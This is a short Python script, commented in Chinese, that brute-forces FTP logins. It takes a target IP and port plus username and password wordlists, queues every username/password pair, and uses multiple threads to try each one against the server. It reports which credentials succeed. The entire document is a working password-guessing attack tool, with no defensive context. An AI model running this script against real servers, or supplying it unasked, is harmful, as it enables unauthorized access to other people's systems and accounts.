

# 多线程
# 简单的模拟登陆测试
# 爆破：IP，端口，
import ftplib
import queue
import sys
import threading

def ftp_brute(ip,port):
    ftp = ftplib.FTP()
    ftp.connect(ip, port)
    while not q.empty():
        dict = q.get()
        dict = dict.split('|')
        username = dict[0]
        password = dict[1]
        try:
            ftp.login(username, password)
            ftp.retrlines('list')
            print(username + "|" + password + "|ok")
        except ftplib.all_errors:
            print(username + "|" + password + "|no")
            pass


if __name__ == '__main__':
    ip =sys.argv[1]
    port = sys.argv[2]
    user_file = sys.argv[3]
    pass_file = sys.argv[4]
    thread_x = sys.argv[5]

    q = queue.Queue()
    for username in open(user_file, encoding="utf-8"):
        for password in open(pass_file, encoding="utf-8"):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            zidian = username + '|' + password
            q.put(zidian)

    for x in range(int(thread_x)):
        t = threading.Thread(target=ftp_brute,args=(ip,port))
        t.start()
